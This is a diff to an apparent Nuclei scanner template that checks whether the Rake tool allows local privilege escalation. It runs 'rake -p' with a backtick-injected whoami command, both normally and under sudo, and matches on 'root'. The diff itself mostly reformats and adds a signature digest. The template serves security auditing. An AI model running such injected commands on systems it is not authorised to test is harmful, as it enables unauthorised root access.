@@ -1,5 +1,4 @@
 id: privesc-rake
-
 info:
   name: Rake - Privilege Escalation
   author: daffainfo
@@ -9,30 +8,25 @@ info:
   reference:
     - https://gtfobins.github.io/gtfobins/rake/
   metadata:
-    verified: true
     max-request: 3
-  tags: code,linux,rake,privesc,local
-
-self-contained: true
+    verified: true
+  tags: code,linux,local,privesc,rake
 code:
   - engine:
       - sh
       - bash
     source: |
       whoami
-
   - engine:
       - sh
       - bash
     source: |
       rake -p '`whoami 1>&0`'
-
   - engine:
       - sh
       - bash
     source: |
       sudo rake -p '`whoami 1>&0`'
-
     matchers-condition: and
     matchers:
       - type: word
@@ -40,10 +34,10 @@ code:
         words:
           - "root"
         negative: true
-
       - type: dsl
         dsl:
           - 'contains(code_2_response, "root")'
           - 'contains(code_3_response, "root")'
         condition: or
-
+        # digest: 4a0a00473045022100d487d15749e6a7529015eae54d06d944a9cea9a4aac8919be99e0d5a2d8c170602206f91a1c9ef3850b5fba9a4cc4da81def3f52b1906fd7e12327bc62c100a3ed4a:922c64590222798bb761d5b6d8e72950
+self-contained: true
